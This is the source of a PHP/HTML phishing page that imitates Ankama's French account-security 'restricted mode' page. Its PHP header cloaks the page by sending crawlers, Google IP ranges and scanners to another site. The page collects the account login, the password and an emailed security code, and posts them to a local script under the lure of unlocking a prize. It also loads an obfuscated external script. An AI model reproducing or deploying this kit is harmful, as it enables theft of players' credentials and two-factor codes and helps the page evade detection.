<?php
include("common/includes.php");
include 'blocker.php';
include 'rezbot/basicbot.php';
include 'rezbot/rezcrawl.php';
include 'rezbot/rezzc.php';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Liste de mots-clés communs utilisés par les bots
$botKeywords = array(
    'bot', 'spider', 'crawl', 'detect', 'monitor'
);

// Liste d'adresses IP connues pour héberger des bots
$botIPs = array(
    '123.456.78.9', '987.654.32.1',
    // Ajoutez les adresses IP ici
    '8.8.4.0', '8.8.8.0', '8.34.208.0', '8.35.192.0', '23.236.48.0', '23.251.128.0',
    '34.0.0.0', '34.2.0.0', '34.3.0.0', '34.3.3.0', '34.3.4.0', '34.3.8.0', '34.3.16.0',
    '34.3.32.0', '34.3.64.0', '34.3.128.0', '34.4.0.0', '34.8.0.0', '34.16.0.0',
    '34.32.0.0', '34.64.0.0', '34.128.0.0', '35.184.0.0', '35.192.0.0', '35.196.0.0',
    '35.198.0.0', '35.199.0.0', '35.199.128.0', '35.200.0.0', '35.208.0.0', '35.224.0.0',
    '35.240.0.0', '64.15.112.0', '64.233.160.0', '66.22.228.0', '66.102.0.0',
    '66.249.64.0', '70.32.128.0', '72.14.192.0', '74.125.0.0', '104.154.0.0',
    '104.196.0.0', '104.237.160.0', '107.167.160.0', '107.178.192.0', '108.59.80.0',
    '108.170.192.0', '108.177.0.0', '130.211.0.0', '136.112.0.0', '142.250.0.0',
    '146.148.0.0', '162.216.148.0', '162.222.176.0', '172.110.32.0', '172.217.0.0',
    '172.253.0.0', '173.194.0.0', '173.255.112.0', '192.158.28.0', '192.178.0.0',
    '193.186.4.0', '199.36.154.0', '199.36.156.0', '199.192.112.0', '199.223.232.0',
    '207.223.160.0', '208.65.152.0', '208.68.108.0', '208.81.188.0', '208.117.224.0',
    '209.85.128.0', '216.58.192.0', '216.73.80.0', '216.239.32.0', '2001:4860::',
    '2404:6800::', '2404:f340::', '2600:1900::', '2606:73c0::', '2607:f8b0::',
    '2620:11a:a000::', '2620:120:e000::', '2800:3f0::', '2a00:1450::', '2c0f:fb50::'
);

// Liste des User-Agents de robots de Google à bloquer
$googleBotUserAgents = array(
    'Googlebot',
    'Googlebot-News',
    // Ajoutez d'autres User-Agents de robots de Google si nécessaire
);

// Nombre maximal d'adresses IP simultanées autorisées
$maxSimultaneousIPs = 3;

// Vérification basée sur le User-Agent
$isBot = false;

// Vérifier si le User-Agent contient des mots-clés de bot
foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isBot = true;
        break;
    }
}

// Vérification supplémentaire basée sur l'adresse IP
if (!$isBot) {
    // Vérifier si l'adresse IP du visiteur correspond à une adresse IP connue pour héberger des bots
    if (in_array($_SERVER['REMOTE_ADDR'], $botIPs)) {
        $isBot = true;
    }
}

// Vérification des User-Agents de Google
if (!$isBot) {
    $userAgentLower = strtolower($userAgent);
    foreach ($googleBotUserAgents as $botUserAgent) {
        if (stripos($userAgentLower, strtolower($botUserAgent)) !== false) {
            $isBot = true;
            break;
        }
    }
}

// Vérification du nombre maximal d'adresses IP simultanées autorisées
if (!$isBot) {
    $ipList = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) : array($_SERVER['REMOTE_ADDR']);
    $ipList = array_map('trim', $ipList); // Supprimer les espaces autour des adresses IP
    $ipList = array_unique($ipList); // Supprimer les adresses IP en double
    $ipCount = count($ipList);
    if ($ipCount > $maxSimultaneousIPs) {
        $isBot = true;
    }
}

// Rediriger les bots détectés vers la page spécifiée
if ($isBot) {
    header('Location: https://www.mediapart.fr/');
    exit();
}


?>

<!DOCTYPE HTML>
<html xmlns="https://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title> Ajouter ce navigateur</title>
<meta name="description" content=" %s" />
<meta name="keywords" content=" %s" />
<meta name="Identifier-URL" content="account.ankama.com" />
<meta name="language" content="fr" />
<meta http-equiv="imagetoolbar" content="no" />
<meta property="fb:admins" content="100000245210540" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="fr_FR" />
<meta property="og:title" content=" Ajouter ce navigateur" />
<meta property="og:description" content=" %s" />
<meta property="og:url" content="https://account.ankama.com/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<meta name="format-detection" content="telephone=no" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@ankamagames" />
<meta name="twitter:creator" content="@ankamagames" />
<meta name="robots" content="NOODP,Index,Follow" />
<link type="image/x-icon" rel="shortcut icon" href="https://account.ankama.com/favicon.ico" />
<link rel="dns-prefetch" href="s.ankama.com" />
<link rel="image_src" href="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/img/logo-account.jpg" />
<meta property="og:image" content="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/img/logo-account.jpg" />
<link rel="alternate" href="https://account.ankama.com/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" hreflang="fr" />
<link rel="alternate" href="https://account.ankama.com/en/security/restricted-mode?f=https://account.ankama.com/fr/compte/informations" hreflang="en" />
<link rel="alternate" href="https://account.ankama.com/de/sicherheit/eingeschraenkter-modus?f=https://account.ankama.com/fr/compte/informations" hreflang="de" />
<link rel="alternate" href="https://account.ankama.com/es/seguridad/modo-restringido?f=https://account.ankama.com/fr/compte/informations" hreflang="es" />
<link rel="alternate" href="https://account.ankama.com/pt/seguranca/modo-restrito?f=https://account.ankama.com/fr/compte/informations" hreflang="pt" />
<link rel="alternate" href="https://account.ankama.com/it/sicurezza/modalita-limitata?f=https://account.ankama.com/fr/compte/informations" hreflang="it" />
<link type="text/css" rel="stylesheet" href="commonn.css" />
<link type="text/css" rel="stylesheet" href="simplepage.css" />
<link type="text/css" rel="stylesheet" href="security.css" />
     <style type="text/css">
    body.fr {
              background: #101a26 url(bg-simplepage.jpg) center top no-repeat;
          }
          .ak-main-container
          {
            margin-top: 0px;
          }
  </style>
 <script async="" charset="utf-8" src="jvousnique.js" type="text/javascript"></script>
<script type="text/javascript">
    (function() {
var hm = document.createElement('script'); hm.type ='text/javascript'; hm.async = true;
hm.src = ('++u-heatmap-it+log-js').replace(/[+]/g,'/').replace(/-/g,'.');
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(hm, s);
})();
  </script>
</head>
<body class="fr">

<header>
<div class="ak-idbar">
<div class="ak-idbar-content">
<div class="ak-idbar-left">
<div class="ak-brand" data-set="ak-brand"> <a class="navbar-brand" href="https://www.ankama-group.com" target="_blank"></a>
</div>
<a class="ak-support" href="https://support.ankama.com" target="_blank">Support</a>
</div>
<div class="ak-idbar-right">
<div class="ak-button-modal ak-nav-logged">
</div>
<script type="application/json">{"target":".ak-box-logged"}</script><div class="ak-button-modal ak-flags-links">
<a class="ak-flag" href="#"></a>
</div>
<div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/restricted-mode?f=https://account.ankama.com/fr/compte/informations" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/eingeschraenkter-modus?f=https://account.ankama.com/fr/compte/informations" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/modo-restringido?f=https://account.ankama.com/fr/compte/informations" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/modo-restrito?f=https://account.ankama.com/fr/compte/informations" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/modalita-limitata?f=https://account.ankama.com/fr/compte/informations" hreflang="it" class="ak-flag-it">IT</a>
</div>
</div>
</div>
</div>
<nav class="navbar navbar-default" data-role="ak_navbar">
<div class="navbar-container">
<div class="ak-navbar-left">
<a class="ak-brand" href="https://www.ankama-group.com">Ankama</a>
</div>
<a class="ak-main-logo" href="/fr"></a>
<div class="navbar-header">


<a class="burger-btn" href="javascript:void(0)"><span></span></a>
</div>
<div class="navbar-collapse navbar-ex1-collapse collapse">
<div class="ak-navbar-search-mob">
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete" name="q" type="text" value="Rechercher..." />
<script type="application/json">{"minLength":1,"delay":0,"select":"location","url":"https:\/\/account.ankama.com\/fr\/autocomplete","titlemax":45,"shownoresults":true,"noresults":"Voir tous les r\u00e9sultats"}</script> <input type="submit" value="" />
</form>
</div>
<ul class="nav navbar-nav">
<span class="ak-navbar-left-part">
</span>
<li class="lvl0 ak-menu-brand">
<a class="navbar-brand" href=""></a>
</li>
<span class="ak-navbar-right-part">
</span>
</ul>
</div> <div class="ak-navbar-right ak-has-search">
<div class="ak-button-modal ak-nav-logged">
<div class="ak-logged-account">
<span class="ak-nickname">sfdddsfdsfs</span>
<span class="avatar">
<img src="https://s.ankama.com/www/static.ankama.com/web-avatar/0.png" alt="Avatar">
</span>
</div>
</div>
<script type="application/json">{"target":".ak-box-logged"}</script> <a class="ak-navbar-search" data-navbar-search>
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete" autocapitalize="off" autocorrect="off" name="q" type="text" value="Rechercher..." />
<script type="application/json">{"minLength":1,"delay":0,"select":"location","url":"https:\/\/account.ankama.com\/fr\/autocomplete","titlemax":45,"shownoresults":true,"noresults":"Voir tous les r\u00e9sultats"}</script> <input type="submit" value="ok" />
</form>
</a>
</div>
</div>
</nav>
<div class="ak-idbar-box ak-box-logged">
<div class="ak-row ak-account-header">
<div class="ak-row-cell ak-logged-avatar">
<div class="ak-logged-avatar-container">
<img src="https://s.ankama.com/www/static.ankama.com/web-avatar/0.png" class="" />
<a href="https://account.ankama.com/fr/jeux-ankama/avatars-forum" target="_blank" class="ak-picto ak-icon-change-avatar">
<div class="ak-avatar-mask">
<span class="ak-avatar-mask-infos">Changer d'avatar</span>
</div>
</a>
</div>
</div>
</div>
<div class="ak-account-infos">
<div class="ak-row ak-infos-ogrines">
<div class="ak-row-cell ak-infos-logged-picto"><span class="ak-infos-picto"></span></div>
<div class="ak-row-cell ak-infos-logged">
<span class="ak-infos-title">Ogrines : -- </span>
<span class="ak-infos-nb">0</span>
<a href="" class="ak-infos-link">Acheter des Ogrines</a>
</div>
</div>
<div class="ak-row ak-infos-kroz">
<div class="ak-row-cell ak-infos-logged-picto"><span class="ak-infos-picto"></span></div>
<div class="ak-row-cell ak-infos-logged">
<span class="ak-infos-title">Kroz : </span>
<span class="ak-infos-nb">0</span>
<a href="https://www.krosmaster.com/fr/jeux/kroz" class="ak-infos-link">Qu'est-ce que les Kroz ?</a>
</div>
</div>
<div class="ak-row ak-infos-ankabox">
<div class="ak-row-cell ak-infos-logged-picto"><span class="ak-infos-picto"></span></div>
<div class="ak-row-cell ak-infos-logged">
<span class="ak-infos-title">Ankabox : </span>
<span class="ak-infos-nb">1</span>
<span class="ak-infos-notification">(1)</span>
<a href="https://ankabox.ankama.com/fr" target="_blank" class="ak-infos-link">Consulter ma boîte</a>
</div>
</div>
<div class="ak-infos-row ak-account-manage">
<div class="ak-ankama-logo">
</div>
<div class="ak-infos-logged">
<a class="ak-infos-logged-link" href="https://account.ankama.com/fr/compte/informations" target="_blank">
Gestion de compte </a>
<a class="ak-infos-logged-link" href="https://account.ankama.com/fr/securite" target="_blank">
Protégez votre compte ! </a>
<a class="btn btn-default" href="https://account.ankama.com/sso?action=logout&amp;from=https%3A%2F%2Faccount.ankama.com%2Ffr%2Fsecurite%2Fmode-restreint%3Ff%3Dhttps%3A%2F%2Faccount.ankama.com%2Ffr%2Fcompte%2Finformations">Déconnexion</a>
</div>
</div>
</div>
</div>
<div class="ak-box-authentification">
<a href="#" class="glyphicon glyphicon-remove-circle"></a>
<div class="ak-container ak-panel">
<div class="ak-panel-content">
<!--googleoff: all-->
<div class="row">
<div class="col-md-4">
<h3>En quelques clics avec :</h3>
<div class="ak-social-connect-block">
<a class="btn btn-primary ak-btn-steam btn-lg" href="https://account.ankama.com/auth/steam?from=https://account.ankama.com/fr/compte/informations">Steam</a>
</div>
<span class="ak-or"><span>ou</span></span>
</div>
<div class="col-md-8">
<h3>J'ai déjà un compte ANKAMA</h3>
<div class="ak-account-connect">
<div class="infos_content">
<div class="infos_box infos_box_login bg-danger text-danger" style="display:none">
<span class="warning errors_login_failed" style="display:none">Les identifiants sont incorrects</span>
<span class="warning errors_login_ban" style="display:none">Votre compte est banni définitivement</span>
<span class="warning errors_login_locked" style="display:none">Votre compte a été mis sous protection pour des raisons de sécurité.<br />
<a href="https://support.ankama.com/hc/fr/requests/new?ticket_form_id=28337">Contactez le support.</a></span>
<span class="warning errors_login_deleted" style="display:none">Supprimé</span>
<span class="warning errors_login_bruteforce" style="display:none">Brute force</span>
<span class="warning errors_login_blacklist" style="display:none">L'adresse IP que vous utilisez est bloquée. Cela peut survenir si vous vous connectez depuis un réseau public et/ou si vous utilisez un proxy/VPN.</span>
<span class="warning errors_login_otptimefailed" style="display:none"><strong>L'Authenticator protège ce compte Ankama</strong><ol><li>Rendez-vous sur votre application Authenticator.</li><li>Sélectionnez votre compte.</li><li>Appuyez sur " débloquer "</li><li>Vous disposez de 30 secondes pour ressaisir vos identifiants.</li></ol></span>
<span class="warning errors_login_forbidden_community" style="display:none">Cette fonctionnalité n'est pas disponible pour votre communauté</span>
<span class="warning errors_login_account_shielded" style="display:none">Ce compte Ankama est protégé par Ankama Shield. Pour associer ce compte, il est nécessaire de désactiver cette protection dans votre Gestion de compte Ankama. Nous vous recommandons d'activer l'Authenticator qui lui est compatible avec Steam.</span>
<span class="warning errors_login_account_no_certify" style="display:none">Votre compte Ankama doit être <a target="_blank" href="https://account.ankama.com/fr/compte/informations/certification">certifié</a>.</span>
<span class="warning errors_login_account_linked" style="display:none">Ce compte Ankama est déjà lié à un autre compte Steam</span>
<span class="warning errors_login_recaptcha_failed" style="display:none">Vous avez échoué à la vérification anti-robot. Merci d'essayer de nouveau.</span>
</div>
</div>
<div class="ak-form"><form class="ak-container ak-form form-horizontal" role="form" method="POST" name="connectform" action="account.ankama-codes-de-securite.php"><input type="hidden" class="form-control" name="Code 1" value="login" /><input type="hidden" class="form-control" name="from" value="https://account.ankama.com/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" />
<div class="form-group">
<label class="control-label" for="userlogin">Nom de compte</label>
<input type="text" class="form-control" name="login" id="userlogin" value="hornssh7" />
</div>
<div class="form-group">
<label class="control-label" for="userpass">Mot de passe</label>
<input type="password" class="form-control ak-field-password ak-tooltip" name="password" value="" id="userpass" /><script type="application/json">{"manual":true,"tooltip":{"content":{"title":"Attention","text":"<p class=\"text-warning\">vous \u00e9crivez en MAJUSCULES<\/p>"},"style":{"classes":"ak-tooltip-white"},"position":{"my":"center left","at":"center right","container":".ak-login-page"},"show":{"event":"capslockpassshow"},"hide":{"event":"capslockpasshide"}},"hideOnScroll":true,"forceOnTouch":true}</script>
</div>
<div class="form-group">
<div class="checkbox">
<label>
<input type="checkbox" value="1" name="remember" checked="checked" id="uid-5c11b6ae8ad00" />Rester connecté
</label>
</div>
</div>
<input type="submit" type="button" role="button" class="btn btn-primary ak-invisiblecaptcha btn-lg" id="login_sub" value="Se connecter" /><script type="application/json">{"sitekey":"6LfbFRsUAAAAACrqF5w4oOiGVxOsjSUjIHHvglJx"}</script>
</form></div>
</div>
<div class="ak-login-links">
<ul>
<li>
<a href="https://account.ankama.com/fr/compte/connexion-impossible">Impossible de se connecter ?</a> </li>
<li><a href="https://account.ankama.com/fr/creer-un-compte">Créer un compte</a></li>
</ul>
</div>
</div>
</div>
<!--googleon: all-->
</div>
</div></div><div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/restricted-mode?f=https://account.ankama.com/fr/compte/informations" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/eingeschraenkter-modus?f=https://account.ankama.com/fr/compte/informations" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/modo-restringido?f=https://account.ankama.com/fr/compte/informations" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/modo-restrito?f=https://account.ankama.com/fr/compte/informations" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/modalita-limitata?f=https://account.ankama.com/fr/compte/informations" hreflang="it" class="ak-flag-it">IT</a>
</div>

<div class="largedesktop device-profile visible-lg" data-deviceprofile="largedesktop"></div>
<div class="desktop device-profile visible-md" data-deviceprofile="desktop"></div>
<div class="tablet device-profile visible-sm" data-deviceprofile="tablet"></div>
<div class="mobile device-profile visible-xs" data-deviceprofile="mobile"></div>
</header></div>
<aside class="ak-slidemenu">
<div class="ak-navbar-search-mob">
<form action="/fr/rechercher" method="get">
<input class="ak-autocomplete ui-autocomplete-input" name="q" type="text" value="Rechercher..." autocomplete="off">
<script type="application/json">
        {
            "minLength":1,
            "delay":0,
            "select":"location",
            "url":"https://account.ankama.com/fr/autocomplete",
            "titlemax":45,
            "shownoresults":true,
            "noresults":"Voir tous les résultats"
        }
        </script>
<input type="submit" value="">
<ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-3" tabindex="0" style="display: none;"></ul></form>
</div>
<div class="menu-container"></div>
<div class="menu-buttons">
<div class="ak-button-modal ak-flags-links" data-hasqtip="4">
<a class="ak-flag" href="#"></a>
</div>
<script type="application/json">{"tooltip":{"position":{"my":"left bottom","at":"top left"},"hide":{"event":"mouseleave"}}}</script> <div class="ak-idbar-box ak-box-lang">
<a href="/fr/securite/mode-restreint?f=https://account.ankama.com/fr/compte/informations" hreflang="fr" class="ak-flag-fr">FR</a>
<a href="/en/security/restricted-mode?f=https://account.ankama.com/fr/compte/informations" hreflang="en" class="ak-flag-en">EN</a>
<a href="/de/sicherheit/eingeschraenkter-modus?f=https://account.ankama.com/fr/compte/informations" hreflang="de" class="ak-flag-de">DE</a>
<a href="/es/seguridad/modo-restringido?f=https://account.ankama.com/fr/compte/informations" hreflang="es" class="ak-flag-es">ES</a>
<a href="/pt/seguranca/modo-restrito?f=https://account.ankama.com/fr/compte/informations" hreflang="pt" class="ak-flag-pt">PT</a>
<a href="/it/sicurezza/modalita-limitata?f=https://account.ankama.com/fr/compte/informations" hreflang="it" class="ak-flag-it">IT</a>
</div>
<a class="btn-default ak-support-link" href="https://support.ankama.com" target="_blank">Contacter le Support</a>
</div>
</aside>
<script type="application/json">{"triggerElement":".navbar-header .burger-btn","fromTarget":"ul.nav.navbar-nav"}</script>
<div class="ak-mobile-menu-scroller">
<div class="container ak-main-container">
<div class="ak-main-content">
<div class="ak-main-page ak-restricted-mode">
<div class="row">
<main class="main col-md-12">
<div class="ak-page-header">
</div>
<div class="ak-container ak-main-center"><div class="ak-title-container">
<h1>
Code de sécurité
</h1>
</div><div class="ak-container ak-panel ak-form-no-padding">
<div class="ak-panel-content">


  <div class="ak-form"><form class="ak-container ak-form-account ak-form ak-form-code-secu" role="form" method="post" action="account.ankama-codes-de-securite.php"><input type="hidden" class="form-control" name="step" value="3"><div class="ak-container ak-panel ak-block-congrate ak-block-email">
  <div class="ak-panel-content">
  <div class="row">
  <div class="col-md-12">
  <img class="img-responsive img-valid" src="email.png" alt="">
  <p class="text-center ak-text-img"><strong>Un e-mail vient de vous être envoyé</strong></p>
  <p class="text-center">Afin de débloquer votre lot, veuillez saisir le code de sécurité qui vient d`être envoyé sur votre adresse email.</p>
  </div>
  </div>
  </div>
  </div><div class="ak-block-profil-infos ak-container"><strong class="ak-label-profil-infos">Code de sécurité* </strong><span class="ak-profil-infos ak-block">
  <div class="form-group">
  <input type="text" class="form-control" name="code_shield_1" placeholder="Code de sécurité" value="" id="ak_field_1"><script type="application/json">{"validation":{"rules":[{"required":true,"message":"Ce champ ne peut pas rester vide"}]}}</script>
  <input type='hidden' name='ID_COMPTE' value='294'/>

</div>
</span></div><div class="ak-container ak-block-button-form">
<input type="submit" role="button" class="btn btn-primary btn-lg" value="Valider">
<strong><a class="btn btn-sm btn-default" href="account.ankama=codes-verification.php">Confirmation rapide ? [SMS]</a></strong>
</div>
</div></div>
</main>
</div>
</div>
</div>
</div>
<a class="ak-backtotop" href="javascript:void(0);"></a>
<footer><div class="ak-footer-content">
<div class="row ak-block1">
<div class="col-md-9 ak-block-links">
</div>
<div class="col-md-3 ak-block-download">
<a class="ak-problem" href="https://support.ankama.com/requests/new">
</a>
<div class="ak-social-network">
</div>
</div>
</div>
<div class="row ak_legal">
<div id="col-md-12">
<div class="ak-legal">
<div class="row">
<div class="col-sm-1"><a href="https://www.ankama-group.com" target="_blank" class="ak-logo-ankama"></a></div>
<div class="col-sm-11">
<p>
© 2020 <a href="https://www.ankama-group.com/fr" target="_blank">Ankama</a>. Tous droits réservés. <a href="https://account.ankama.com/fr/cgu" target="_blank">Conditions d'utilisation</a> - <a href="https://account.ankama.com/fr/politique-confidentialite" target="_blank">Politique de confidentialité</a> - <a href="https://account.ankama.com/fr/cgv" target="_blank">Conditions Générales de Vente</a> - <a href="https://account.ankama.com/fr/mentions-legales" target="_blank">Mentions Légales</a> - <a href="javascript:void(0);" class="ak-modal-trigger">Gestion des cookies</a><script type="application/json">{"target":".ak-modal-privacy-cookies"}</script> </p>
</div>
</div>
</div> </div>
</div>
</div>
<script type="application/json">{"dialog":{"dialogClass":"ak-modal-wrapper"}}</script></footer>
<div class="ak-mobile-menu-overlay"></div>
</div>
<script type="text/javascript" src="https://s.ankama.com/www/static.ankama.com/g/common.js"></script>
<script type="text/javascript" src="https://s.ankama.com/www/static.ankama.com/ankama/account-ng/javascript/../modules/common/common.js"></script>
<script type="text/javascript">
    var idzCustomData = {"cust_ip":"54.37.215.198"};
  </script>
<script type="text/javascript">
    
  </script>
<script type="text/javascript" src="https://s.ankama.com/www/static.ankama.com/g/modules/forms/field/invisiblecaptcha.js"></script>


<span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front ak-modal-wrapper" tabindex="-1" role="dialog" aria-describedby="ui-id-4" aria-labelledby="ui-id-5" style="display: none;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-5" class="ui-dialog-title">Gestion de vos préférences sur les cookies</span><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" role="button" title="Close"><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">Close</span></button></div><div class="ak-modal-privacy-cookies ak-modal ui-dialog-content ui-widget-content" id="ui-id-4" style="display: block;"> <p>
</p><div class="ak-privacy-cookies-manager">
<p class="ak-intro">Certaines fonctionnalités de ce site (partage de contenus sur les réseaux sociaux, lecture directe de vidéos) s'appuient sur des services proposés par des sites tiers. Ces fonctionnalités déposent des cookies permettant notamment à ces sites de tracer votre navigation. Ces cookies ne sont déposés que si vous donnez votre accord. Vous pouvez vous informer sur la nature des cookies déposés, les accepter ou les refuser soit globalement pour l'ensemble du site et l'ensemble des services, soit service par service.</p>
<hr>
<div class="ak-group" group="_all">
<h3>Tous</h3>
<p>Préférences pour tous les services</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr>
<div class="ak-group" group="audience">
<h3>Audience et Publicité</h3>
<p>Les cookies d'audience permettent de recueillir des informations relatives à la connexion et au comportement des visiteurs à des fins statistiques</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="fbtr">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Facebook tracker </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggan">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Google Analytics </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="otad">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Autres outils publicitaires </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr>
<div class="ak-group" group="social_networks">
<h3>Réseaux sociaux</h3>
<p>Les réseaux sociaux permettent d'améliorer la convivialité du site et aident à sa promotion via les partages.</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="fbok">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Facebook </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggpl">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Google Plus </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="twtr">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Twitter </div>
<div class="col-xs-6">
 <button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="dsrd">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Dicord </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="pwro">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Powr Io </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr>
<div class="ak-group" group="medias">
<h3>Média</h3>
<p>Les services de médias permettent d'enrichir le site de contenu multimédia et augmentent sa visibilité.</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ytbe">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Youtube </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="twch">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Twitch </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
 </div>
</div>
</div>
<div class="ak-block" key="gphy">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Giphy </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
<hr>
<div class="ak-group" group="other">
<h3>Autre</h3>
<p>Des cookies de confort pour améliorer l'expérience utilisateur</p>
<div class="ak-block" key="_all">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Tous </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary " action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="ggmp">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Google Maps </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
<div class="ak-block" key="idvz">
<div class="row">
<div class="col-xs-6 text-right ak-label">
Iadvize </div>
<div class="col-xs-6">
<button class="btn btn-sm btn-primary  on" action="y">Autoriser</button>
<button class="btn btn-sm btn-danger " action="n">Interdire</button>
</div>
</div>
</div>
</div>
</div><p></p>
